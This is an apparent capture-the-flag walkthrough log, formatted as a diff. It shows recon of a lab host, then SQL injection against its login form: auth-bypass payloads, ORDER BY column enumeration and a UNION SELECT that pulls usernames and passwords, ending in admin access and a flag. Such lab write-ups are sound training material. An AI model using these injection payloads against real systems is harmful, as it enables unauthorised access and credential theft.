@@ -1,0 +1,86 @@
+## ── Step 1: Initial Recon ────────────────────────────────────────────────────
+nmap -sV -sC -p- 10.129.44.22 --open
+
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.129.44.22
+Host is up (0.031s latency).
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.54
+|_http-title: CTF Login Portal
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+22/tcp   open  ssh     OpenSSH 8.9p1
+Nmap done: 1 IP address (1 host up) scanned in 42.33 seconds
+
+## ── Step 2: Web Enum ─────────────────────────────────────────────────────────
+gobuster dir -u http://10.129.44.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Medhurst (@_FireFart)
+===============================================================
+[+] Url:      http://10.129.44.22
+Progress: 1024 / 220561 (0.46%)
+Progress: 8192 / 220561 (3.71%)
+/index.php           (Status: 200) [Size: 4312]
+/admin               (Status: 301) [Size: 312]
+/backup              (Status: 403) [Size: 289]
+/config.php          (Status: 200) [Size: 0]
+Progress: 220561 / 220561 (100.00%)
+Finished
+===============================================================
+
+## ── Step 3: Login Endpoint Analysis ─────────────────────────────────────────
+curl -i http://10.129.44.22/index.php
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<form method="POST" action="/index.php">
+  <input name="username" type="text">
+  <input name="password" type="password">
+  <button type="submit">Login</button>
+</form>
+
+## ── Step 4: SQLi Test — Basic Auth Bypass ───────────────────────────────────
+# Tried: admin' OR '1'='1
+curl -X POST http://10.129.44.22/index.php -d "username=admin'+OR+'1'%3D'1&password=test"
+HTTP/1.1 200 OK
+Invalid credentials. Try again.
+
+# Tried: comment-based bypass
+curl -X POST http://10.129.44.22/index.php -d "username=admin'--+-&password=x"
+HTTP/1.1 200 OK
+Invalid credentials. Try again.
+
+## ── PIVOT: Basic bypass failed — moving to UNION-based extraction ────────────
+# Searched: "MySQL UNION SELECT number of columns detection"
+# Searched: "ORDER BY clause column count enumeration SQLi"
+
+curl -X POST http://10.129.44.22/index.php \
+  -d "username=admin' ORDER BY 3--+-&password=x"
+HTTP/1.1 500 Internal Server Error
+
+curl -X POST http://10.129.44.22/index.php \
+  -d "username=admin' ORDER BY 2--+-&password=x"
+HTTP/1.1 200 OK
+Invalid credentials.
+# → 2 columns confirmed
+
+## ── Step 5: UNION SELECT credential extraction ───────────────────────────────
+curl -X POST http://10.129.44.22/index.php \
+  -d "username=notexist' UNION SELECT username,password FROM users--+-&password=x"
+
+HTTP/1.1 200 OK
+Welcome back, admin!
+Session token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+## ── Step 6: Admin Panel Access ──────────────────────────────────────────────
+curl -s http://10.129.44.22/admin/ \
+  -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+HTTP/1.1 200 OK
+<html>
+<h1>Admin Panel</h1>
+<p>Flag: HTB{unl0ck3d_by_sql_1nj3ct10n_m4st3ry}</p>
+</html>
+
+## ── Captured Flag ────────────────────────────────────────────────────────────
+HTB{unl0ck3d_by_sql_1nj3ct10n_m4st3ry}
